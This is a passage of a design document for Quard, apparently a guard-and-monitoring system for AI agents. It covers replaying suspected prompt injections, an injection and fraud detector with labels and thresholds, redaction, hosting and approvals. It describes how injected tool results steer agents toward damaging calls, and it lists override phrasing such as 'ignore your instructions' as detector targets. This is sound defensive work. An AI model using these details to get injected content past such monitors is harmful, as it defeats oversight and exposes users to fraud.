    - **confirmed**: after any round, harm is clearly more common with the content than without (one-sided Fisher test, p < 0.0182)
    - **not confirmed**: even if every remaining rerun went the right way, the test could not pass by 20 each
    - **could not reproduce**: 0 harmful runs in the first 10 with the content
- A rerun counts as harmful when the model asks for the same damaging tool call: same tool, same key value after normalizing. When the model made the original value up, such as a mistyped IBAN, a value the suspect content holds counts instead.
- Across agents, when the turning call never read the suspect content itself, the side without it leaves out the message that carried it in.
- A verdict with no suspect content, such as bad reasoning, has nothing to replay, and the incident says so.
- The cap is $5 per incident. It covers every model call the finder makes, replay and AI reviewer included. Replay stops before a round would pass the cap and reports the counts so far. The replay button then offers to continue with $5 more, and the rounds so far are kept. (**Owner**)

Replay rules:

- Use the exact recorded model and settings.
- Never run real tools. Each rerun is one model call, and the tool calls it asks for are only read.
- Resend the full recorded input with `store: false`. Never use `previous_response_id`, which would bring the suspect content back.
- Hosted MCP tools get `require_approval: "always"` and are never approved. The approval request counts as the model's action.
- Hosted web search tools are left out of the request.
- Hashed values are replaced with stand-ins in a valid format, built from the stored hash. An IBAN gets a valid checksum, and an email keeps its domain.
- The "without" side replaces the suspect tool result with `[Removed for replay]`. The tool call itself stays.
- Warm the prompt cache with one call per side, then send the rest in parallel. Skip batch APIs in v1.

**The recorded request.** A Responses result does not include its input, so the SDK records the request of each model call for replay.

- It is recorded only while uploads to `webhook` are on, and only up to 512 KiB, together with the response's assistant text. Agents that resend the whole history on every call pass that size in long runs. While `webhook` is down, the SDK holds at most 32 Mi characters of them and drops the oldest first.
- Only the fields that shape the answer are kept: the model, instructions, input, tools, tool choice and the sampling and output settings, plus `previous_response_id` and `conversation`. Never `stream`, `store`, `metadata`, `user` or `include`.
- It is redacted like every event, so secrets are removed and IBANs, cards and emails are masked. Values of fields named like secrets become `…`, and replay repairs tool schemas cut this way.
- A request chained with `previous_response_id` is rebuilt from the run: the earlier request's full input, its response's assistant text and tool calls, then this request's input. Reasoning items can't be resent.
- Two values with the same mask share one stand-in, and a rerun that uses it counts as asking for either.
- When the turning point has no recorded cost, replay guesses one from the request size and won't start a round the guess says would pass the cap.

**Limited replay.** Replay does not run, and the incident says why, when:

- the turning-point request was not recorded, because uploads were off or it passed 512 KiB
- earlier history was not recorded: the request chains to a response Quard has no request for, or uses `conversation`
- the suspect content is not a tool result in the turning-point request, nor came in through a message from another agent, such as content that only came from a hosted web search

What replay can't show:

- causes that trigger the harm rarely: at 1 run in 5, they are confirmed only about 20% of the time
- that the removed content was the only cause
- how a different model version would behave

### AI reviewer

Q17, **Claude's pick**. After an incident, an AI writes a short plain-words explanation of the verdict.

- It uses the team's own provider key, the one their agents already use, set on the worker as `OPENAI_API_KEY`. Replay uses the same key. Without it, the note is skipped, and replay fails with a message that asks for the key.
- The default model is `gpt-6.1-sol`, at about $0.10 to $0.20 per explanation.
- It reads the verdict with IBANs and emails replaced by placeholders, such as `[IBAN 1]`.
- It only explains. The verdict comes from labels, value tracing and replay.

## AI inside Quard

Decided by the spec, Q25, Q26 and Q27, and by the owner's content-label decisions on 2026-10-03.

- **AI never sets origin, trust or sensitivity.** Content judged by a model can argue its way to trusted, so origin stays a recorded fact.
- **AI adds content labels.** Jev, and an AI for what Jev can't place, label what content is, such as `invoice` or `payment_fraud`. (**Owner**)
- **Detectors only tighten.** A risky label can flag content, or strip the chunk, up to 4,000 characters, that holds a likely prompt injection. It can never allow what a rule blocked, or raise trust.

### Detector

Q25, **Claude's pick**. The labels and acting in v1 were decided by the **owner**.

- Jev from TypeSafe, pinned to `jev-1.13.0`, behind a small detector interface. Other detectors can be swapped in later. A team turns it on in code with a TypeSafe API key, and until then nothing is labeled.
- For each chunk of public content, Jev answers two questions in one request: which label from a fixed list fits best, with the chance of every label, and yes or no, does any part of it try to instruct the AI agent reading it. The list includes `none`.
- Before a chunk leaves the process, secrets are removed and emails, IBANs and card numbers are masked. Values of fields named like secrets, such as `password` or `client_secret`, are never sent, also when the JSON arrives as text, as most MCP results do.
- It acts by default: the SDK waits up to 5 s in total for Jev, with at most 8 requests in flight per process, then flags or strips. A busy or unreachable API gets one retry, unless its `Retry-After` asks for more than 1.5 s or the 5 s wait runs out. A team can switch it to observe, in code or in the policy file. Observe saves the labels without waiting, so it adds no delay.
- A chunk that fails, answers late or can't reach the API is unchecked. The SDK still acts on the chunks that answered, and flags the content `detector:unchecked`. Like any flag, it only counts in action rules: a value from it fails `from` rules, which block by default, and makes never-seen rules ask a person. Egress guards and `max` rules don't read flags. A warning gives the reason, such as `http_401` or `timeout`. (**Owner**)
- Jev is a hosted API only. The content and the longest question must fit in 32,000 tokens together, so content is split first. Short values, and keys that read like text, are packed together. Long texts are cut into chunks of up to 4,000 characters at line breaks, sentence ends or spaces, never inside an IBAN, card number, email or secret.
- TypeSafe quotes 70 to 500 ms per call ([InfoQ](https://www.infoq.com/news/2026/10/typesafe-ai-jev-released/)). Its own docs say most calls take about 100 ms. See [TypeSafe's models page](https://docs.typesafe.ai/models).
- It can return a wrong but valid answer, and its docs warn that injected text can move its answer. Test it on the team's own injection examples.
- Jev leans toward the options it reads first, so the risky labels come first in the list.
- Jev can't write text, so the AI reviewer and the AI fallback use a different model.
- Two more questions are planned, off by default because they need internal data: does a user message hold pasted outside content, such as a forwarded email, and does a tool call match the user's original task.

### Labels

**Claude's pick**, after the owner asked for labels that cover likely cases.

| Label | Risky | Covers |
| --- | --- | --- |
| `prompt_injection` | yes | Text that speaks to an AI agent: ignore your instructions, use a tool, send data, hide something |
| `payment_fraud` | yes | Changed bank details, a new IBAN, urgent or unexpected payments, gift cards, crypto |
| `phishing` | yes | Pretends to be a trusted company or person to get a login, a code or a click |
| `malicious_code` | yes | Code or commands that would harm a system if run |
| `invoice` | no | Ordinary invoices, receipts, quotes and statements |
| `business_message` | no | Ordinary work email, chat and tickets |
| `promotion` | no | Adverts, newsletters and offers |
| `documentation` | no | Product docs, help articles and API references |
| `article` | no | News, blog posts, reports and reference pages |
| `search_results` | no | Lists of links with snippets |
| `code` | no | Ordinary code, configuration and logs |
| `data_records` | no | Table rows, JSON from an API, CRM or database entries |
| `none` | no | Nothing else fits, so the AI fallback labels it |

- A chunk's risk is the sum of the chances of its risky labels. Content with a chunk whose risk reaches the flag threshold gets a flag named after the most likely risky label, such as `detector:payment_fraud`. A value from flagged content no longer counts as coming from its origin, and never-seen rules ask a person about it.
- The other labels change nothing. They show what agents read, in the run view and the review queue.
- The exact wording Jev reads is in `packages/shared/labels/detector.ts`.

### AI fallback

**Owner**. The details are **Claude's pick**.

- When Jev picks `none`, the `worker` asks an AI to label the stored chunk: one of the fixed labels if one fits, or else a new short label with a one-line reason.
- It uses the team's own provider key and model, like the AI reviewer.
- It runs after the call, so its label never changes a guard decision. It shows in the run view and the review queue. A new label that keeps coming up can join the fixed list.

### What AI models may see

Q26, **Claude's pick**.

- Internal run data goes only to the provider the agents already use, which also runs the AI reviewer. Secrets are removed, and emails and IBANs become placeholders.
- Jev is run by another company. By default it gets only content labeled public, such as web pages, email and MCP results. Intranet hosts and a team's own MCP servers count as public too until the team marks them internal. Every `email:` origin is public, so a colleague's mail read by an inbox tool goes to Jev too: the origin comes from the tool's arguments, such as `email:readInbox`, not from the sender. Marking that origin internal keeps all its mail away from Jev, outside mail included. Content from an origin marked internal is never sent to it. Names, street addresses and phone numbers are sent as written.
- The AI fallback gets the same redacted public chunks that Jev got, through the team's own provider.
- The pasted-content and task-match questions need internal data: the user's message, the task and the tool's arguments. They stay off until a team turns them on and adds the detector to its `egress` allowlist.
- A short description of the app, written by the team, may be sent as context. It holds no user data.

### Thresholds

Q27, **Claude's pick**.

| Check | Flag | Ask | Block or strip |
| --- | --- | --- | --- |
| Risky labels, added up | 0.50 | — | — |
| Injection: the yes or no answer, or the `prompt_injection` chance | — | — | strip the chunk at 0.90 |
| Pasted outside content (planned) | 0.50 | — | — |
| Tool call doesn't match the task (planned) | 0.50 | 0.80 | never |

A strip removes the whole chunk, ordinary text in it included, and the agent is not told. The yes or no answer catches an injection that a label misses: one buried in a long chunk, or one Jev splits between `prompt_injection` and `payment_fraud`. A key can't be removed, so a key that holds an injection only flags the content `detector:prompt_injection`.

Jev acts with these thresholds by default. Check them on at least 200 reviewed examples per risky label from the review queue, tune them where needed, and keep the model version pinned.

## Data, storage and hosting

Decided by Q18 and Q19, all **Claude's pick**.

### Hosting

- Self-hosted first. Teams run `web`, `webhook`, `control`, `worker` and Postgres as Docker containers from one compose file, in their own cloud. Traces stay in their network, except the model calls listed in [What AI models may see](#what-ai-models-may-see).
- A hosted service comes later from the same code. Every stored row carries a project id, so that is not a rewrite. Agents never hold the install's hash key, so a hosted user needs only an agent key. See [Redaction](#redaction).

### Storage

- Postgres 18 is the only database. It holds runs, steps, messages, labels, guard decisions, approvals, memory labels, labeled chunks for review, the value index for search, and incidents, whose rows are also the job queue.
- ClickHouse can come later if volume demands it.

### Retention

- Runs are deleted after 30 days. Each project can change this.
- Runs tied to an incident are kept for 1 year, so verdicts and replay keep working.
- Labeled chunks go with their run. Runs with reviewed chunks are kept for 1 year, so the reviewed examples last. (**Claude's pick**)
- Memory labels are not deleted with runs.
- The hashed first-seen index for the fleet check is kept for 1 year, so old values don't look new again.
- The worker deletes expired data every hour, in small batches, one project at a time. A run is deleted once both its start and its last event are past the window, so a run still getting events stays. (**Claude's pick**)
- Approval requests go once their run is gone. Revoked "always approve" grants go after the run window; active ones stay. Day counters go 2 days after their day, and closed SDK connections after 30 days. (**Claude's pick**)

### Redaction

- The SDK removes secrets, such as API keys and tokens, before anything leaves the process.
- IBANs, card numbers and emails become keyed hashes plus a mask, such as `DE89…3000`. The email domain stays visible.
- The user and password in a URL, such as `redis://user:pass@host`, are removed. A password that holds an apostrophe is not found in v1.
- The same normalized value always gives the same hash in a project, so search and value tracing still match.
- Ids are never masked. Run and step ids, agent versions, rules hashes and approval request ids keep their form, even when their digits pass a card check. Otherwise `webhook` would refuse the whole batch.
- Secrets never become value keys. Values of fields named like secrets, such as `password` or `token`, and secrets inside text, such as `password=…` or a bearer token, are left out when Quard builds the keys for search and value tracing. Guards still scan them.
- Guards see real values in memory. The dashboard shows masks. Replay uses stand-ins. The AI reviewer sees placeholders.
- The one exception is an open approval request: the approver sees the full values. After the decision only the hash and the masked arguments are kept.
- Chunks Jev labels are stored as they were sent to it, for the review queue: secrets removed, and emails, IBANs and cards masked. Only public content is stored this way. (**Owner**)
- The hash is HMAC-SHA-256. The install has one random 32-byte key, `QUARD_HASH_KEY`, and only the server holds it: `webhook`, `control` and `web`. It is never sent to agents or to us. (**Owner**)
- Each project hashes with its own key, made from the install's key by `projectHashKey()` in `packages/shared`. Wherever the server hashes or redacts, such as search input, it uses the key of the request's project. (**Owner**)
- Agents never set a hash key. The SDK gets its project's key with its agent key: `control` sends it in the `ready` message, and `webhook` serves it at `GET /v1/hash-key`, with `401 invalid_agent_key` for a bad or revoked key. Whichever answers first wins; both give the same key. (**Owner**)
- Until the SDK has the key, events wait in the upload buffer and retry as they do while `webhook` is down. `quard.inject()`, `quard.resume()` and shared memory wait up to 5 s for it, then go on without storing their label records (`label_record_not_stored`). No raw value ever leaves the process. Without a backend nothing leaves the process, so no key is needed. (**Owner**)
- Why: users of a hosted Quard can't be given the install's key. With it and a copy of the database, anyone could hash guessed IBANs or emails and find them in every customer's data. The agent key is now the only secret a user needs.
- The move to project keys changes every hash once. Search misses older IBANs and emails, older memory items read back as untrusted, "always approve" grants ask again, and the fleet check sees every IBAN and email as new.
- To rotate the install's key, add a new one and keep the old one for search until old runs expire.
- Names and street addresses stay in clear in v1, because finding them needs a model.
- v1 finds IBANs (pattern and mod-97 check), card numbers (pattern and Luhn check), emails and secrets (gitleaks-style patterns).

## Services

- **Auth.** The SDK talks to `webhook` and `control` with agent keys only. Keys are created and revoked in the dashboard.
- **webhook** receives SDK events: model calls, tool calls, guard decisions, labels, labeled chunks and messages.
    - It checks them against the shared schemas and writes them to Postgres. A decision that blocks a tool call, or would in observe mode, opens the run's incident, which queues the finder's jobs.
    - The format is our own JSON API, not OpenTelemetry. (**Claude's pick**)
    - Most events arrive in batches. Label records that another process may read right away, such as messages to other agents and memory writes, are sent at once to `POST /v1/labels`. They are acknowledged only after they are stored. (**Claude's pick**)
    - `GET /v1/hash-key` answers an agent key with its project's hash key. See [Redaction](#redaction). (**Owner**)
- **control** is the SDK's live link to the backend. The SDK keeps one long-lived connection to it and reconnects if it drops.
    - **Connect:** the SDK registers its agents, their versions and its active rules. The `ready` answer carries the project's hash key.
    - **Counters:** per-day counters, fleet counters, per-run counters for runs that span processes, and quarantine lists.
    - **Approvals:** it creates requests, tracks heartbeats from waiting calls, and returns the decision to the waiting call.
    - **Revocation:** revoked agent keys and revoked "always approve" decisions.
    - **Label lookups:** the labels behind a reference in a message, a memory item or a chained response. (**Claude's pick**)
- **worker** runs jobs from the queue: the root-cause finder, replay, the AI reviewer, the AI fallback for `none` labels and retention cleanup. It has no endpoint.
    - **Queue:** a Postgres table, with no queue library. Each incident row holds the state of its own jobs: the verdict, the AI note and replay. The worker claims a due row with `FOR UPDATE SKIP LOCKED` and a 10-minute lease, and runs up to 4 jobs at once. It looks for work every second. If a worker stops mid-job, its lease runs out and another worker takes the job. (**Claude's pick**, owner approved)
    - **Settings:** `DATABASE_URL` is required. `OPENAI_API_KEY` is the team's own key for the AI reviewer and replay; without it, the note is skipped, and replay fails with a message that asks for the key. `OPENAI_BASE_URL` is optional and defaults to `https://api.openai.com/v1`.
- **web** is the dashboard. It reads and writes Postgres through its own server code and does not call `control`. When an approver decides, `web` writes the decision to Postgres, and `control` hears about it through Postgres `LISTEN/NOTIFY`. `control` also checks for decisions once a second, so a missed notification only delays the answer. (**Claude's pick**)
- **Dashboard sign-in.** Privy, with an email code or GitHub. There are no passwords. Anyone who signs in with a verified email or a GitHub account can use the dashboard. Quard keeps its own signed session cookie. Every approval records who decided. (**Owner**)

## Dashboard

From the spec, plus the approval decisions.

- **Run view:** one run as a timeline colored by labels.
- **Incident view:** the path from entry point to damage, the verdict and a replay button. The button starts replay, and after the cap it offers to continue with $5 more.
- **Summary view:**
    - which sources and tools cause the most incidents
    - what guards block
    - which agents are most often entry or turning points
    - which agent-to-agent links carry the most untrusted content
- **Agent graph:** agents as nodes and messages as edges colored by labels, with a click-through to each agent's timeline.
- **Search** across all runs: for example every run that touched a domain or used a given IBAN. Sensitive values are searched by their keyed hash.
- **Approvals:** open requests with their arguments, origins and influence path, answered with approve once, always approve or deny. Also a list of "always" approvals that can be revoked.
- **Labels:** a review queue of labeled chunks, least sure first. A person marks each label right or wrong, or picks the right one. It counts reviewed examples per label and shows how often each risky label was right at the current thresholds. (**Owner**, details **Claude's pick**)
- **Settings:** agent keys, accounts and retention. Origin overrides and rules are shown read-only, because they live in code and the policy file.

Follow [web/DESIGN.md](web/DESIGN.md) for the look. Read Next's bundled docs before writing code there, as [web/AGENTS.md](web/AGENTS.md) says.

## Decision record

"By" says who decided: the owner, the spec's Guards in depth tab, or Claude after "go with your own picks".

| # | Question | Decision | By |
| --- | --- | --- | --- |
| Q1 | How monitor gets the input side | Wrap the client once, as its `fetch` | Owner |
| Q2 | First providers and languages | OpenAI Responses API, TypeScript | Owner |
| Q3 | Hosted web search | Allowed at URL level and recorded as `unscanned`; teams' own guarded search tool for page text | Owner |
| Q4 | Name | Quard. `quard` was free on npm and PyPI on 2026-10-03 | Owner |
| Q5 | Who sets trust | Built-in defaults, per-origin overrides in code or the policy file | Owner |
| Q6 | Where rules live | Code, plus an optional policy file operators can change while agents run; the dashboard shows them | Owner |
| Q7 | Rollout mode | Block by default, observe per rule; product defaults start in observe | Owner |
| Q8 | Where approvals happen | A dashboard page | Owner |
| Q9 | Fleet check trigger | New within 7 days; a 5th separate run within 24 h | Owner |
| Q10 | Run and agent tags | Scoped run context | Spec |
| Q11 | Tags and labels across processes | Ids and a label reference, on every channel | Owner |
| Q12 | Agent-to-agent messages | Guarded send function; receive wrapped with a `source` guard | Owner, spec |
| Q13 | First framework | OpenAI Agents SDK (JS) | Owner |
| Q14 | Shared memory | Generic store wrapper | Owner |
| Q15 | Run limits | Balanced: depth 3, fan-out 10, 5 handoffs back and forth, 200 steps, $5 | Claude's pick |
| Q16 | Replay | Up to 20 with and 20 without, rounds of 5, early stop, $5 cap | Claude's pick |
| Q17 | AI reviewer model | The team's own provider key, set on the worker as `OPENAI_API_KEY`; `gpt-6.1-sol` | Claude's pick |
| Q18 | Hosting | Self-hosted first, hosted later | Claude's pick |
| Q19 | Retention and redaction | 30 days, incidents 1 year; remove secrets, hash IBANs, cards and emails | Claude's pick |
| Q20 | When a guard blocks | A refusal the model reads; throwing is opt-in | Owner |
| Q21 | Waiting for approval | Pause and wait | Owner |
| Q22 | Value matching | Exact after normalizing, also inside longer text | Owner |
| Q23 | Backend down | Split by guard type | Owner |
| Q24 | Approval time limits | No time limit; approve once or always approve (same agent, tool and arguments, until revoked) | Owner |
| Q25 | AI detector | Jev, swappable; labels public content; acts by default, can be switched to observe | Claude's pick, Owner |
| Q26 | Data for AI models | Internal data only to the team's own provider, masked; Jev gets public content only | Claude's pick |
| Q27 | Detector thresholds | Flag at 0.5 on the risky labels added up; strip at 0.9 on the yes or no injection answer or the label's chance; tune on reviewed examples; acts by default | Claude's pick |
| — | Repo layout | The owner's tree; TypeScript in one pnpm workspace | Owner, Claude's pick |
| — | Where guards run | In-process; the backend for shared state | Spec |
| — | Database and queue | Postgres only; the queue is a table: incident rows hold their job state, and the worker claims them with `FOR UPDATE SKIP LOCKED` and a lease, every second | Claude's pick, owner approved |
| — | SDK event format | Our own JSON API to `webhook`; W3C ids | Claude's pick |
| — | SDK link to `control` | One WebSocket that reconnects; `control` also checks for decisions every second | Claude's pick |
| — | Agent keys | One key per app; an app may host several agents | Claude's pick |
| — | Late "approve once" | Used by the next identical call | Claude's pick |
| — | Per-day limits | Per tool across the project, per UTC day | Claude's pick |
| — | Label records | Values only as keyed hashes; a record vouches only for the same run and content | Claude's pick |
| — | `inject` and `resume` | Both return promises; the record is stored before the message leaves | Claude's pick |
| — | Carrier on HTTP | W3C `baggage`; `quard.toBaggage()` writes it | Claude's pick |
| — | Shared memory API | `quard.memory(store, { name })`; labels merge to the least trusted | Claude's pick |
| — | Agents SDK API | `quardRunner()` and `guardedTool()` from `quard/openai-agents`; blocks become tool guardrail rejections | Claude's pick |
| — | Run limit settings | `runLimits` in code and the policy file; `delegateTo` on a limit guard | Claude's pick |
| — | Shared run counters | Steps, cost and per-run tool counts in `control`; fan-out and loops per process | Claude's pick |
| — | Auth | Agent keys for the SDK; Privy sign-in (email code or GitHub) for the dashboard | Owner |
| — | Hash keys | One install key, only on the server; each project hashes with its own key made from it; the SDK gets its project's key with its agent key, from `control`'s `ready` or `webhook`'s `GET /v1/hash-key` | Owner |
| — | SDK names | The `quard` object (`wrap`, `run`, `agent`, `configure`, `inject`, `resume`), `guard()`, `isGuardRefusal`, `GuardBlockedError` | Owner |
| — | Blocked tool calls inside monitor | The call stays in the response, marked blocked; the guarded tool refuses it | Owner |
| — | x402 payments | A sixth guard type, `x402`, before signing; every x402 response recorded; milestone after M4 | Owner |
| — | x402 approvals | Rare: only above a set amount; limits decide the rest | Owner |
| — | x402 chains and tokens | No rule depends on the chain; no token blocked for what it is | Owner |
| — | Wallet addresses | Stored in clear, since they are public on chain | Owner |
| — | x402 defaults | $1 per payment, $5 per run, $50 per day, untrusted origins blocked; observe mode first | Claude's pick |
| — | x402 SDK names | `quard.x402()`, `quard.x402Fetch()`, `quard.x402Mcp()` | Claude's pick |
| — | Content labels | Jev picks one label from a fixed list for public content; `none` goes to an AI | Owner |
| — | Label list | Four risky labels, eight others and `none` | Claude's pick |
| — | Jev acting in v1 | Yes: enforce by default; a team can switch it to observe | Owner |
| — | Detector failures | While acting, what the detector could not check is flagged `detector:unchecked` | Owner |
| — | Text for review | Store redacted public chunks for a review queue | Owner |
| — | When an incident opens | A guard blocks a call, or flags or strips what it detected in content, in either mode; one incident per run | Owner |
| — | When replay runs | On a click on the incident page; the verdict and AI note run on their own; past the cap, continue with $5 more | Owner |
| — | Request for replay | The SDK records each model call's redacted request while uploads are on, up to 512 KiB | Claude's pick |
| — | Bad handoff | From the messages and handoffs M4 records; a dropped constraint is never named, since message text is not stored | Owner, Claude's pick |
| — | Self-hosting | One `compose.yaml` at the root; one image for webhook, control, worker and migrate, one for web; built from source | Claude's pick |
| — | Content label review | A Labels page in the dashboard; the AI fallback for `none` uses the team's own key and the reviewer's model | Claude's pick |
| — | Hosted MCP approvals | monitor keeps approval on and never sends the follow-up; `quard.mcpApprovals()` gives the app the answers, refusing blocked calls | Claude's pick |
| — | Hosted tool rules | By the name the model uses, from the policy file or `hostedTools` in code | Claude's pick |
| — | Ask timeout on action and egress | An optional `timeout` in seconds, like the approval guard's; a call waits at most the shortest timeout among the guards that asked | Claude's pick, owner asked |

## Changes to the spec

These points changed the spec. The spec doc was updated to match them on 2026-10-03.

1. **The client is wrapped once.** The spec shows `monitor(await client.responses.create(...))`. Now `quard.wrap(client)` wraps the client once (Q1).
2. **Approvals don't expire.** The spec says an approval is void "if any argument changes or it expires". Now it is void only if an argument changes (Q24).
3. **Labels travel as a reference.** The spec says run tags and labels ride in message metadata. Now only ids and a label reference travel, and labels are looked up through `control` (Q11).
4. **Replay compares both sides.** The spec says replay reruns without the suspect content about twenty times. Now it reruns with and without, up to 20 each, and stops early (Q16).
5. **Hosted tools can't be stopped mid-call.** The spec says guards run before anything executes. Hosted tools run inside the model call, so monitor can only shape the request, like keeping MCP approval on, and check the results afterwards.
6. **Per-run counters for runs that span processes** live in `control`, not only in-process (**Claude's pick**).
7. **AI adds content labels.** The spec says AI never assigns labels. Now Jev, and an AI for what Jev can't place, add labels that say what content is. Origin, trust and sensitivity still never come from AI. The spec doc does not have this change yet.

## Open items

Not decided yet:

- **WebSocket transport.** The OpenAI Agents SDK can reach the Responses API over a WebSocket. The fetch hook does not cover it yet.
- **Node 26** becomes LTS on 2026-10-28. Move the services to it then.
- **Hash key rotation for label records.** Memory labels outlive runs, but their hashes use the project's current key only. A new install key changes every project's key, and items written before it read back as untrusted. Decide whether lookups also try the old key.
- **Runs paused and never resumed.** A run paused for the Agents SDK's own approval stays open in the dashboard until it resumes. Decide when such a run counts as finished.
